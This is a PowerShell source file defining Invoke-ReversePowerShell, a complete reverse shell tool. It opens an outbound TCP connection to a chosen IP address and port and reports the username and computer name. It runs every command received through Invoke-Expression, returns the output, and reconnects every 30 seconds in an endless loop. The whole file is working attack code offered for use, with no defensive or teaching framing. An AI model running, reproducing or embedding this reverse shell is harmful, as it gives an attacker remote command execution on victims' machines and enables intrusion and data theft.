#==========================================================================================================================
# I know Get is not the correct Verb to use but I like it and dont want to confuse this with other Invoke-ReverseShells
#==========================================================================================================================

Function Invoke-ReversePowerShell {
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$True,
                Position=0,
                ValueFromPipeline=$True,
                ValueFromPipelineByPropertyName = $True
            )] # End Parameter
                [ValidateNotNullorEmpty()]
            [IPAddress]$IpAddress,

            [Parameter(
                Mandatory=$True,
                Position=1,
                ValueFromPipeline=$False
            )] # End Parameter
                [ValidateNotNullorEmpty()]
                [ValidateRange(1,65535)]
            [int32]$Port
        ) # End param

    $GodsMakeRules = "They dont follow them"

    While ($GodsMakeRules -eq 'They dont follow them')
    {

        $ErrorActionPreference = 'Continue'

        Try
        {

            Write-Host "Connection attempted. Check your listener." -ForegroundColor 'Green'

            $Client = New-Object System.Net.Sockets.TCPClient($IpAddress,$Port)

            $Stream = $Client.GetStream()

            [byte[]]$Bytes = 0..255 | ForEach-Object -Process {0}

            $SendBytes = ([Text.Encoding]::ASCII).GetBytes("$env:USERNAME connected to $env:COMPUTERNAME "+"`n`n" + "PS " + (Get-Location).Path + "> ")

            $Stream.Write($SendBytes,0,$SendBytes.Length);$Stream.Flush()

            While(($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
            {
                $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $i)

                If($Command.StartsWith("kill-link"))
                {

                    Clear-Host;

                    $Client.Close()

                    Exit

                } # End If

                Try
                {

                    # Executes commands
                    $ExecuteCmd = (Invoke-Expression -Command $Command -ErrorAction SilentlyContinue | Out-String )

                    $ExecuteCmdAgain  = $ExecuteCmd + "PS " + (Get-Location).Path + "> "

                } # End Try
                Catch
                {

                    $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage

                    $ExecuteCmdAgain  =  "ERROR: " + $Error[0].ToString() + "`n`n" + "PS " + (Get-Location).Path + "> "

                    Clear-Host

                } # End Catch

                $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($ExecuteCmdAgain)

                $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)

                $Stream.Flush()

            } # End While

        } # End Try
        Catch
        {
            Write-Host "There was an initial connection error. Retrying in 30 seconds..." -ForegroundColor 'Red'

            If($Client.Connected)
            {

                $Client.Close()

            } # End If

            Clear-Host

            Start-Sleep -s 30

        } # End Catch

    } # End While

} # End Function Invoke-ReversePowerShell
